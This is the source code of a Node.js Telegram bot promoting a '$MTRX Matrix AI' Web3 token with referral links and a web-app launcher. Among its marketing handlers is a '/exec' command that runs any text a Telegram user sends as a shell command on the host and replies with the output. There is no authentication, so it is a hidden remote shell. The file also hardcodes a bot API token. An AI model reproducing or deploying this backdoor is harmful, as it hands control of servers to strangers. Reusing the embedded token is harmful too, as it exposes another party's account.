const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const AppToken = '7646877814:AAFx-LjNMqIqzLs-30pTwM_vVrV0w5DHDLA';
const bot = new TelegramBot(AppToken, { polling: true });

const MATRIX_START_TEXT = `
Want to know how cool your Telegram presence is? 
Check your profile rating and unlock awesome rewards with $MTRX Matrix AI!

Time to vibe ✨ and step into the world of Web3.
$MTRX is on the way... Ready to explore something new?

Take the first step and see just how you stack up!
`;

async function getUsername(userId) {
    try {
        const user = await bot.getChat(userId);
        return user.username ? `@${user.username}` : user.first_name;
    } catch (error) {
        console.error("Error fetching user:", error);
        return "Unknown"; 
    }
}

bot.onText(/\/exec (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const command = match[1];

    const processingMessage = await bot.sendMessage(chatId, '`Processing...`', { parse_mode: 'Markdown' });

    exec(command, (error, stdout, stderr) => {
        let response = "";

        if (error) {
            response += `<b>Error:</b> <code>${error.message}</code>\n`;
        }

        if (stderr) {
            response += `<b>stderr:</b> <code>${stderr.trim()}</code>\n`;
        }

        if (stdout) {
            response += `<b>stdout:</b> <code>${stdout.trim()}</code>\n`;
        }

        if (!response) {
            response = 'No output from command';
        }

        bot.editMessageText(response, {
            chat_id: chatId,
            message_id: processingMessage.message_id,
            parse_mode: 'HTML'
        });
    });
});

bot.onText(/\/start(\s+(\S+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const commandArgs = match[2];

    if (commandArgs && commandArgs.startsWith('ref_')) {
        const inviterId = commandArgs.split('ref_')[1];
        const inviterName = await getUsername(inviterId);

        const messageText = `${MATRIX_START_TEXT}\nInvited by: ${inviterName}`;
        const inlineKeyboard = {
            inline_keyboard: [
                [{ text: "Play Now 🪂", web_app: { url: `https://mtx-ai-bot.vercel.app/?userId=${userId}&inviterId=${inviterId}` } }],
                [{ text: "Join Community 🔥", url: "https://telegram.me/MatrixAi_Ann" }]
            ]
        };

        await bot.sendPhoto(chatId, "https://i.ibb.co/XDPzBWc/pngtree-virtual-panel-generate-ai-image-15868619.jpg", {
            caption: messageText,
            reply_markup: inlineKeyboard
        });

        await bot.sendMessage(inviterId, `${msg.from.username || msg.from.first_name} Joined via your invite link !`);
    } else {
        const inlineKeyboard = {
            inline_keyboard: [
                [{ text: "Play Now 🪂", web_app: { url: `https://mtx-ai-bot.vercel.app/?userId=${userId}` } }],
                [{ text: "Join Community 🔥", url: "https://telegram.me/MatrixAi_Ann" }]
            ]
        };

        await bot.sendPhoto(chatId, "https://i.ibb.co/XDPzBWc/pngtree-virtual-panel-generate-ai-image-15868619.jpg", {
            caption: MATRIX_START_TEXT,
            reply_markup: inlineKeyboard
        });
    }
});

bot.onText(/\/referrals/, async (msg) => {
    const chatId = msg.chat.id;
    const referralLink = `https://telegram.me/MTRXAi_Bot/start?ref_${msg.from.id}`;
    await bot.sendMessage(chatId, `Here is your referral link: ${referralLink}`);
});

console.log('Bot is running...');
